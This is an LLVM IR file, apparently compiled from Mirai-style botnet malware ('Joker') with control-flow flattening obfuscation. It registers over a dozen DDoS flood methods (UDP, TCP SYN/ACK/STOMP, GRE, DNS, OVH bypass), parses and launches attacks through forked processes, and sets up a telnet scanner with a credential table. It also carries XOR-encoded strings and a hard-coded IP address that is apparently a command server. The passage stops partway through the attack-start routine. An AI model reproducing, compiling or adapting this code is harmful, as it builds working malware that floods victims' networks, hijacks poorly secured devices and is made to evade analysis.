; ModuleID = 'host/ir_fla/Joker.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.scanner_connection = type { %struct.scanner_auth*, i32, i32, i32, i32, i16, i32, [256 x i8], i8 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }
%struct.fd_set.28 = type { [16 x i64] }
%struct.timeval.29 = type { i64, i64 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [15 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@scanner_pid = common global i32 0, align 4
@fake_time = global i32 0, align 4
@conn_table = common global %struct.scanner_connection* null, align 8
@rsck = common global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"&;; \00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"<!: acam\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c" 18:1 \00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"0125!8 \00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"$5''#;&0\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"509=:\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"\22=.,\22\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"'!$$;& \00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"c!>\19?;d509=:\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"efg`a\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"!'1&\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"\1B,<8#\07\13l\00", align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"\07f2\13%\1A\12'\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [16 x i8] c"173.232.146.173\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = global i16 0, align 2
@auth_table_len = global i32 0, align 4
@auth_table = global %struct.scanner_auth* null, align 8
@table = common global [31 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -555811921, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpgeneric)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpvse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpdns)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstomp)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpxmas)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_std)
  call void @add_attack(i8 zeroext 14, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_ovh)
  call void @add_attack(i8 zeroext 11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpusyn)
  call void @add_attack(i8 zeroext 12, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpall)
  call void @add_attack(i8 zeroext 13, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpfrag)
  call void @add_attack(i8 zeroext 15, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_asyn)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #6
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %switchVar = alloca i32
  store i32 -61594721, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -61594721, label %2
    i32 -1907580764, label %6
    i32 -816819982, label %13
    i32 1927851718, label %19
    i32 1396952018, label %23
    i32 1155999100, label %26
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:2:                                      ; preds = %loopEntry
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 15
  %5 = select i1 %4, i32 -1907580764, i32 1155999100
  store i32 %5, i32* %switchVar
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp ne i32 %10, 0
  %12 = select i1 %11, i32 -816819982, i32 1927851718
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %1, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = call i32 @kill(i32 %17, i32 9) #6
  store i32 1927851718, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %1, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %21
  store i32 0, i32* %22, align 4
  store i32 1396952018, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %1, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %1, align 4
  store i32 -61594721, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  ret void

loopEnd:                                          ; preds = %23, %19, %13, %6, %2, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %.reg2mem = alloca i64
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  store i64 %14, i64* %.reg2mem
  %switchVar = alloca i32
  store i32 582742461, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 582742461, label %first
    i32 1502814367, label %17
    i32 1592216247, label %18
    i32 -295087762, label %32
    i32 -1296062505, label %33
    i32 49660753, label %44
    i32 1751490938, label %45
    i32 -390314877, label %57
    i32 -1099893651, label %58
    i32 971555656, label %66
    i32 1079694177, label %67
    i32 -589967056, label %72
    i32 933482979, label %78
    i32 -1957770874, label %120
    i32 -2004376068, label %123
    i32 1676367541, label %128
    i32 -1401303254, label %129
    i32 651835040, label %141
    i32 -984456516, label %146
    i32 380565005, label %152
    i32 -628373232, label %157
    i32 315446963, label %158
    i32 450362978, label %175
    i32 -8440767, label %176
    i32 1610294247, label %189
    i32 901563779, label %190
    i32 1809228030, label %219
    i32 -15371443, label %222
    i32 1954241677, label %223
    i32 -771794973, label %231
    i32 1720216688, label %235
    i32 -2116603915, label %238
    i32 -926273104, label %242
    i32 -492568827, label %246
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i64, i64* %.reg2mem
  %15 = icmp ult i64 %.reload, 4
  %16 = select i1 %15, i32 1502814367, i32 1592216247
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 -771794973, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %3, align 8
  %20 = bitcast i8* %19 to i32*
  %21 = load i32, i32* %20, align 4
  %22 = call i32 @ntohl(i32 %21) #7
  store i32 %22, i32* %6, align 4
  %23 = load i8*, i8** %3, align 8
  %24 = getelementptr inbounds i8, i8* %23, i64 4
  store i8* %24, i8** %3, align 8
  %25 = load i32, i32* %4, align 4
  %26 = sext i32 %25 to i64
  %27 = sub i64 %26, 4
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %4, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 -295087762, i32 -1296062505
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -771794973, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %3, align 8
  %36 = load i8, i8* %34, align 1
  store i8 %36, i8* %7, align 1
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = sub i64 %38, 1
  %40 = trunc i64 %39 to i32
  store i32 %40, i32* %4, align 4
  %41 = load i32, i32* %4, align 4
  %42 = icmp eq i32 %41, 0
  %43 = select i1 %42, i32 49660753, i32 1751490938
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 -771794973, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8*, i8** %3, align 8
  %47 = getelementptr inbounds i8, i8* %46, i32 1
  store i8* %47, i8** %3, align 8
  %48 = load i8, i8* %46, align 1
  store i8 %48, i8* %8, align 1
  %49 = load i32, i32* %4, align 4
  %50 = sext i32 %49 to i64
  %51 = sub i64 %50, 1
  %52 = trunc i64 %51 to i32
  store i32 %52, i32* %4, align 4
  %53 = load i8, i8* %8, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 0
  %56 = select i1 %55, i32 -390314877, i32 -1099893651
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 -771794973, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %4, align 4
  %60 = sext i32 %59 to i64
  %61 = load i8, i8* %8, align 1
  %62 = zext i8 %61 to i64
  %63 = mul i64 5, %62
  %64 = icmp ult i64 %60, %63
  %65 = select i1 %64, i32 971555656, i32 1079694177
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 -771794973, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8, i8* %8, align 1
  %69 = zext i8 %68 to i64
  %70 = call noalias i8* @calloc(i64 %69, i64 24) #6
  %71 = bitcast i8* %70 to %struct.attack_target*
  store %struct.attack_target* %71, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  store i32 -589967056, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %5, align 4
  %74 = load i8, i8* %8, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp slt i32 %73, %75
  %77 = select i1 %76, i32 933482979, i32 -2004376068
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %3, align 8
  %80 = bitcast i8* %79 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %82, i64 %84
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i32 0, i32 1
  store i32 %81, i32* %86, align 4
  %87 = load i8*, i8** %3, align 8
  %88 = getelementptr inbounds i8, i8* %87, i64 4
  store i8* %88, i8** %3, align 8
  %89 = load i8*, i8** %3, align 8
  %90 = getelementptr inbounds i8, i8* %89, i32 1
  store i8* %90, i8** %3, align 8
  %91 = load i8, i8* %89, align 1
  %92 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %92, i64 %94
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i32 0, i32 2
  store i8 %91, i8* %96, align 4
  %97 = load i32, i32* %4, align 4
  %98 = sext i32 %97 to i64
  %99 = sub i64 %98, 5
  %100 = trunc i64 %99 to i32
  store i32 %100, i32* %4, align 4
  %101 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %101, i64 %103
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i32 0, i32 0
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %105, i32 0, i32 0
  store i16 2, i16* %106, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 1
  %112 = load i32, i32* %111, align 4
  %113 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %113, i64 %115
  %117 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i32 0, i32 0
  %118 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %117, i32 0, i32 2
  %119 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %118, i32 0, i32 0
  store i32 %112, i32* %119, align 4
  store i32 -1957770874, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %5, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %5, align 4
  store i32 -589967056, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i32, i32* %4, align 4
  %125 = sext i32 %124 to i64
  %126 = icmp ult i64 %125, 1
  %127 = select i1 %126, i32 1676367541, i32 -1401303254
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 -771794973, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8*, i8** %3, align 8
  %131 = getelementptr inbounds i8, i8* %130, i32 1
  store i8* %131, i8** %3, align 8
  %132 = load i8, i8* %130, align 1
  store i8 %132, i8* %9, align 1
  %133 = load i32, i32* %4, align 4
  %134 = sext i32 %133 to i64
  %135 = sub i64 %134, 1
  %136 = trunc i64 %135 to i32
  store i32 %136, i32* %4, align 4
  %137 = load i8, i8* %9, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp sgt i32 %138, 0
  %140 = select i1 %139, i32 651835040, i32 1954241677
  store i32 %140, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  %142 = load i8, i8* %9, align 1
  %143 = zext i8 %142 to i64
  %144 = call noalias i8* @calloc(i64 %143, i64 16) #6
  %145 = bitcast i8* %144 to %struct.attack_option*
  store %struct.attack_option* %145, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  store i32 -984456516, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32, i32* %5, align 4
  %148 = load i8, i8* %9, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp slt i32 %147, %149
  %151 = select i1 %150, i32 380565005, i32 -15371443
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = load i32, i32* %4, align 4
  %154 = sext i32 %153 to i64
  %155 = icmp ult i64 %154, 1
  %156 = select i1 %155, i32 -628373232, i32 315446963
  store i32 %156, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  store i32 -771794973, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %3, align 8
  %160 = getelementptr inbounds i8, i8* %159, i32 1
  store i8* %160, i8** %3, align 8
  %161 = load i8, i8* %159, align 1
  %162 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %163 = load i32, i32* %5, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %165, i32 0, i32 1
  store i8 %161, i8* %166, align 8
  %167 = load i32, i32* %4, align 4
  %168 = sext i32 %167 to i64
  %169 = sub i64 %168, 1
  %170 = trunc i64 %169 to i32
  store i32 %170, i32* %4, align 4
  %171 = load i32, i32* %4, align 4
  %172 = sext i32 %171 to i64
  %173 = icmp ult i64 %172, 1
  %174 = select i1 %173, i32 450362978, i32 -8440767
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 -771794973, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i8*, i8** %3, align 8
  %178 = getelementptr inbounds i8, i8* %177, i32 1
  store i8* %178, i8** %3, align 8
  %179 = load i8, i8* %177, align 1
  store i8 %179, i8* %12, align 1
  %180 = load i32, i32* %4, align 4
  %181 = sext i32 %180 to i64
  %182 = sub i64 %181, 1
  %183 = trunc i64 %182 to i32
  store i32 %183, i32* %4, align 4
  %184 = load i32, i32* %4, align 4
  %185 = load i8, i8* %12, align 1
  %186 = zext i8 %185 to i32
  %187 = icmp slt i32 %184, %186
  %188 = select i1 %187, i32 1610294247, i32 901563779
  store i32 %188, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 -771794973, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i8, i8* %12, align 1
  %192 = zext i8 %191 to i32
  %193 = add nsw i32 %192, 1
  %194 = sext i32 %193 to i64
  %195 = call noalias i8* @calloc(i64 %194, i64 1) #6
  %196 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %197 = load i32, i32* %5, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %199, i32 0, i32 0
  store i8* %195, i8** %200, align 8
  %201 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %202 = load i32, i32* %5, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %201, i64 %203
  %205 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %204, i32 0, i32 0
  %206 = load i8*, i8** %205, align 8
  %207 = load i8*, i8** %3, align 8
  %208 = load i8, i8* %12, align 1
  %209 = zext i8 %208 to i32
  call void @util_memcpy(i8* %206, i8* %207, i32 %209)
  %210 = load i8, i8* %12, align 1
  %211 = zext i8 %210 to i32
  %212 = load i8*, i8** %3, align 8
  %213 = sext i32 %211 to i64
  %214 = getelementptr inbounds i8, i8* %212, i64 %213
  store i8* %214, i8** %3, align 8
  %215 = load i8, i8* %12, align 1
  %216 = zext i8 %215 to i32
  %217 = load i32, i32* %4, align 4
  %218 = sub nsw i32 %217, %216
  store i32 %218, i32* %4, align 4
  store i32 1809228030, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %5, align 4
  %221 = add nsw i32 %220, 1
  store i32 %221, i32* %5, align 4
  store i32 -984456516, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  store i32 1954241677, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = call i32* @__errno_location() #7
  store i32 0, i32* %224, align 4
  %225 = load i32, i32* %6, align 4
  %226 = load i8, i8* %7, align 1
  %227 = load i8, i8* %8, align 1
  %228 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %229 = load i8, i8* %9, align 1
  %230 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %225, i8 zeroext %226, i8 zeroext %227, %struct.attack_target* %228, i8 zeroext %229, %struct.attack_option* %230)
  store i32 -771794973, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %233 = icmp ne %struct.attack_target* %232, null
  %234 = select i1 %233, i32 1720216688, i32 -2116603915
  store i32 %234, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %237 = bitcast %struct.attack_target* %236 to i8*
  call void @free(i8* %237) #6
  store i32 -2116603915, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %240 = icmp ne %struct.attack_option* %239, null
  %241 = select i1 %240, i32 -926273104, i32 -492568827
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %244 = load i8, i8* %9, align 1
  %245 = zext i8 %244 to i32
  call void @free_opts(%struct.attack_option* %243, i32 %245)
  store i32 -492568827, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %242, %238, %235, %231, %223, %222, %219, %190, %189, %176, %175, %158, %157, %152, %146, %141, %129, %128, %123, %120, %78, %72, %67, %66, %58, %57, %45, %44, %33, %32, %18, %17, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -734640825, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -734640825, label %first
    i32 342715691, label %20
    i32 1135410439, label %24
    i32 -1156263390, label %25
    i32 -1224806680, label %30
    i32 316274848, label %31
    i32 -472310001, label %35
    i32 1485046984, label %40
    i32 245092529, label %41
    i32 -94832185, label %47
    i32 177763181, label %60
    i32 381256514, label %72
    i32 1573802380, label %73
    i32 -2082822908, label %76
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp eq i32 %.reload, -1
  %19 = select i1 %18, i32 1135410439, i32 342715691
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %13, align 4
  %22 = icmp sgt i32 %21, 0
  %23 = select i1 %22, i32 1135410439, i32 -1156263390
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  ret void

; <label>:25:                                     ; preds = %loopEntry
  %26 = call i32 @fork() #6
  store i32 %26, i32* %14, align 4
  %27 = load i32, i32* %14, align 4
  %28 = icmp eq i32 %27, -1
  %29 = select i1 %28, i32 -1224806680, i32 316274848
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  call void @exit(i32 0) #8
  unreachable

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i32, i32* %14, align 4
  %33 = icmp eq i32 %32, 0
  %34 = select i1 %33, i32 -472310001, i32 1485046984
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %7, align 4
  %37 = call i32 @sleep(i32 %36)
  %38 = call i32 @getppid() #6
  %39 = call i32 @kill(i32 %38, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:40:                                     ; preds = %loopEntry
  store i32 0, i32* %15, align 4
  store i32 245092529, i32* %switchVar
